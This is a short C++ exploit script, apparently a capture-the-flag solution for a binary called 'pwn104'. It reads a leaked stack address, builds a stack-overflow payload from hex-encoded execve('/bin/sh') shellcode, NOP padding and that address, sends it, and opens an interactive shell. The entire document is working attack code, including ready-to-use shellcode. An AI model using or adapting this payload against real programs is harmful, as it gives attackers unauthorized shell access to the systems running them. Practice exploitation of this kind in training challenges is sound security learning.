//exp104
#include <string>
#include <iostream>
#include <pwntools>

int main(){
using namespace pwn;
Process p{"./pwn104",NULL,0};
p.set_debug(true);
p.recvuntil("0x");
std::string re=p.recv(12);
std::string payload;
std::string shellcode0="48b82f62696e2f73680050545f4831f64831d24831c0b03b0f05";
payload.append(hexstr_to_string(shellcode0));
for(int i=0;i<0x50+0x8-26;i++) payload.append(hex2string(0x90));
payload+=p64(hexstr2long(re));
p.sendline(payload);
p.interactive();
}